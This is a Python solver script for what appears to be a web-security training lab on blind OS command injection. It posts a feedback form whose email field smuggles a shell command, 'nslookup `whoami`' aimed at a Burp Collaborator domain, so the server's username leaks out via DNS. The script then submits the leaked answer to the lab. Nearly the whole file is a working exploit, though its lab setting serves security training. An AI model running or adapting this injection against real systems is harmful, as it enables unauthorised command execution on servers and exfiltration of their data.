import requests
import re
from bs4 import BeautifulSoup

def get_csrf(session, domain):
    r = session.get(domain)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']
    return csrf

def solve(session, domain, client):
    csrf = get_csrf(session, domain + '/feedback')
    data = {
        'csrf': csrf,
        'name': 'test',
        'email': 'a;nslookup `whoami`.{} #'.format(client),
        'subject': 'test',
        'message': 'test'
    }

    payload_url = domain + '/feedback/submit'
    print('After sending the payload')
    session.post(payload_url, data=data)
    
def submit(session, domain, answer):
    data = {
        'answer': answer
    }
    url = domain + '/submitSolution'
    r = session.post(url, data=data)
    if ('true' in r.text):
        print('Submit successfully.')

def verify(session, domain):
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not solved yet.')
        
if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ')
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    burp_client = input('Enter your Burp Collaborator Client: ')
    with requests.Session() as session:
        solve(session, domain, burp_client)
        print('Visit collaborator tab to get the answer.')
        answer = input('Enter the answer: ')
        submit(session, domain, answer)
        verify(session, domain)
    